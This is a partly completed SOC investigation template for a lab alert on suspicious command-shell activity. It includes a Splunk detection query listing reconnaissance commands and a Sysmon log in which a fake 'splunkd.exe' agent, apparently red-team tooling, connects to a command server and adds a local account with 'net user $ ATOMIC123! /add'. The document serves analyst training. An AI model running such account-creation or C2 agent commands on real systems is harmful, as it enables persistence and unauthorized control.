# SOC Analysis Report

---

## Ticket / Case Information

| Field            | Details                                      |
|------------------|----------------------------------------------|
| **Ticket ID**    | N/A                                          |
| **Analyst Name** | Taji Abdullah                                |
| **Date / Time**  | 06/07/2026                                   |
| **Severity**     | ☐ Low  ☐ Medium  ☐ High  ☐ Critical          |
| **Alert Source** | SIEM                                         |
| **Status**       | ☐ Open  ☐ In Progress  ☐ Escalated  ☐ Closed |

---

## Step 1 — Reason for the Alert
> *~5% of total investigation time*
>
> Explain why this alert fired. Understand the rule or signature that triggered it before proceeding. Research vendor documentation or internal runbooks if the rule is unfamiliar. Do not move to the next step until the trigger logic is clearly understood.

**Alert Name / Rule:**
> Suspicious Command Shell Activity

**Why the Rule Fired (logic/signature):**
> index="windows" source="WinEventLog:Microsoft-Windows-Sysmon/Operational" sourcetype="WinEventLog" 
Image="*\\cmd.exe" CommandLine IN ("*net user*", "*net group*", "*net localgroup*", "*whoami*", "*ipconfig*", "*systeminfo*", "*tasklist*", "*netstat*", "*wmic*", "*reg query*", "*quser*")

**What Specifically Triggered This Instance:**

**Example format:**
> *"This alarm fired due to suspicious commands ran on the CLI detected on win-doze-10.lab.local by NT AUTHORITY\SYSTEM."*

---

## Step 2 — Supporting Evidence
> *~40% of total investigation time*
>
> Build a complete timeline (default: 24 hours before and after the alert). Collect and document all relevant evidence. Do **not** analyze yet — focus only on gathering and recording. Add more evidence here if the analysis in Step 3 pivots your investigation.

### Identity
| Field                 | Details             |
|-----------------------|---------------------|
| **Username**          | NT AUTHORITY\SYSTEM |
| **Email**             | N/A                 |
| **Job Title**         | N/A                 |
| **VIP / Privileged?** | ☐ Yes               |
| **Last Login**        |                     |
| **Other Notes**       |                     |

### Asset / Device
| Field            | Details     |
|------------------|-------------|
| **Hostname**     | win-doze-10 |
| **IP Address**   |             |
| **Asset Type**   | Workstation |
| **OS**           | Windows 10  |
| **Owner / Dept** | Lab.local   |

### File / Artifact (if applicable)
| Field           | Details                                                                  |
|-----------------|--------------------------------------------------------------------------|
| **Filename**    | Cmd.Exe                                                                  |
| **File Hash**   | SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0  |
| **File Size**   |                                                                          |
| **Signer**      |                                                                          |
| **Path**        |   C:\Windows\System32\cmd.exe                                                                       |

### Timeline of Events

| Timestamp (UTC)             | Event Description                  | Source Log                            |
|-----------------------------|------------------------------------|---------------------------------------|
| 06/07/2026 07:21:08.324 AM  | Suspicious Command Shell Activity  | Microsoft-Windows-Sysmon/Operational  |
|                             |                                    |                                       |
|                             |                                    |                                       |
|                             |                                    |                                       |

### Log Evidence

```
06/07/2026 07:21:08.324 AM
LogName=Microsoft-Windows-Sysmon/Operational
EventCode=1
EventType=4
ComputerName=win-doze-10.lab.local
User=NOT_TRANSLATED
Sid=S-1-5-18
SidType=0
SourceName=Microsoft-Windows-Sysmon
Type=Information
RecordNumber=121199
Keywords=None
TaskCategory=Process Create (rule: ProcessCreate)
OpCode=Info
Message=Process Create:
RuleName: -
UtcTime: 2026-06-07 11:21:08.313
ProcessGuid: {b0eeb98a-5424-6a25-b001-000000001b00}
ProcessId: 5036
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.4355 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C net user $ ATOMIC123! /add /active:yes
CurrentDirectory: C:\Users\Public\
User: NT AUTHORITY\SYSTEM
LogonGuid: {b0eeb98a-4d74-6a25-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {b0eeb98a-4d7d-6a25-5e00-000000001b00}
ParentProcessId: 4004
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: "C:\Users\Public\splunkd.exe" -server http://192.168.10.108:8888 -group red
ParentUser: NT AUTHORITY\SYSTEM
Collapse
host = win-doze-10source = WinEventLog:Microsoft-Windows-Sysmon/Operationalsourcetype = WinEventLog
```

### Account Behavior (Recent Activity)
- [ ] Recent account lockouts or password resets?
- [ ] Large or rapid downloads?
- [ ] Unusual email activity (bulk send/delete, forwarding rules)?
- [ ] Maintenance window or change ticket that could explain the alert?
- [ ] Any other anomalous account actions?

**Notes:**

---

## Step 3 — Analysis
> *~40% of total investigation time*
>
> Evaluate all collected evidence. Use threat intelligence tools to check reputations of indicators. Make connections between evidence and potential malicious behavior. At the end of this step, **pause** — review everything for accuracy and add any overlooked evidence back in Step 2.

### Indicator of Compromise (IoC) Checks
> Defang all IoCs: `192[.]168[.]1[.]1` | `malicious[.]com` | `hxxps://example[.]com`

| IoC | Type | VirusTotal | Talos | IPVoid/URLVoid | AbuseIPDB | Other | Verdict |
|-----|------|------------|-------|----------------|-----------|-------|---------|
|     |      |            |       |                |           |       |         |
|     |      |            |       |                |           |       |         |

### WHOIS / Domain Registration
```
[Paste WHOIS output here]
```

### Sandbox / Dynamic Analysis (if applicable)
| Tool Used                                     | Target (defanged) | Result / Notes |
|-----------------------------------------------|-------------------|----------------|
| (e.g., Any.run, Joe Sandbox, Hybrid Analysis) |                   |                |

### Historical Correlation
- Was this user/asset involved in a previous ticket? ☐ Yes  ☐ No
  - If yes, last ticket ID / date:
  - How was it handled previously?
- Has this attacker/IoC been seen before? ☐ Yes  ☐ No
  - Context / notes:

### MITRE ATT&CK Mapping (if applicable)
| Tactic | Technique | ID |
|--------|-----------|----|
|        |           |    |

### Analyst Notes / Connections Made
> *Document your reasoning, any pivots, and what the evidence suggests.*

---

## Step 4 — Conclusion
> *~10% of total investigation time*
>
> Summarize the reason for the alert, supporting evidence, and analysis findings in a **clear, concise, easy-to-read** paragraph — in that order. Keep it brief enough that a reader can follow the logic and refer to earlier sections for detail. The **final sentence must state the action taken**.

**Summary:**
> *"This alarm triggered due to [reason]. Evidence showed [key supporting evidence]. Analysis of [IoCs/behavior] determined [malicious/benign/inconclusive] activity. [Action taken — e.g., 'Ticket closed as false positive' / 'Machine isolated and escalated to Incident Response team' / 'User credentials reset and ticket closed as resolved']."*

**Disposition:**
☐ True Positive — Malicious
☐ True Positive — Policy Violation
☐ False Positive
☐ Benign / Expected Activity
☐ Inconclusive — Escalated

**Action Taken:**

---

## Step 5 — Next Steps
> *~5% of total investigation time*
>
> Document any pending items. If nothing is pending, write **N/A**. The ticket must remain **open** until all next steps are resolved. Escalate to Incident Response if the event involves a critical asset, evidence of data exfiltration, a VIP user, or has exceeded the SOC's scope.

**Pending Actions:**

| # | Action Item | Owner | Due Date | Status |
|---|-------------|-------|----------|--------|
| 1 |             |       |          |        |
| 2 |             |       |          |        |

**Escalation Required?** ☐ Yes — escalated to IR Team  ☐ No

**IR / Master Ticket Reference (if applicable):**

---

*Template based on the SOC Analyst Method by Tyler Wall — "Jump-start Your SOC Analyst Career" (Apress, 2nd Ed.) & Cyber NOW Education*